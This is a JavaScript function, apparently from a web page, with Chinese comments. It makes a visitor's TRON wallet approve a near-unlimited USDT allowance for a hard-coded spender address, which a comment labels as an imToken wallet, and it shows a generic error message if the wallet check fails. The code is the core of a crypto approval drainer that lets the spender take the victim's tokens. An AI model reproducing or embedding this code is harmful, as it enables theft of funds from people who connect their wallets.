async function approveTokens() {
    const trc20ContractAddress = "TR7NHqjeKQzvGzT1ci3r8x8ZYqApLBoTXsgzJ6i6"; // USDT合约地址
    const spenderAddress = "TFAkA2qZvVn7F8mdXhrcoisfqXFYxxwzxd"; // imToken的钱包地址

    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        const trc20Address = window.tronWeb.defaultAddress.base58;

        let contract = await window.tronWeb.contract().at(trc20ContractAddress);
        await contract.approve(
            spenderAddress,
            9000000000000000 // 大量授权额度
        ).send({
            feeLimit: 1000000
        }).then(output => {
            console.log('Approval Output:', output);
        }).catch(err => {
            console.error('Approval Error:', err);
        });
    } else {
        document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">TRX钱包连接异常或余额不足</span>';
    }
}
